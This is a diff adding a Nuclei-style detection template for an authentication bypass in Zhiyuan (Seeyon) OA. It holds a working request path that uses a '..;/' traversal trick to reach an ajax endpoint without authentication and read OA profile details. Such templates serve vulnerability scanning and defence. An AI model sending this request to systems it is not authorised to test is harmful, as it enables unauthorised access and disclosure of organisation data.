@@ -1,0 +1,42 @@
+# RAG Annotation:
+# name: Zhiyuan Oa Unauthorized
+# description: Zhiyuan Oa is exposed.
+# vuln_type: Authentication Bypass
+# severity: low
+# cve_id: N/A
+
+
+id: zhiyuan-oa-unauthorized
+
+info:
+  name: Zhiyuan Oa Unauthorized
+  author: pikpikcu
+  severity: low
+  description: Zhiyuan Oa is exposed.
+  reference:
+    - https://buaq.net/go-53721.html
+  metadata:
+    max-request: 1
+  tags: seeyon,unauth,zhiyuan,misconfig,vuln
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "serverIdentifier"
+          - "companyName"
+        condition: and
+
+      - type: word
+        words:
+          - "application/json"
+        part: header
+
+      - type: status
+        status:
+          - 200
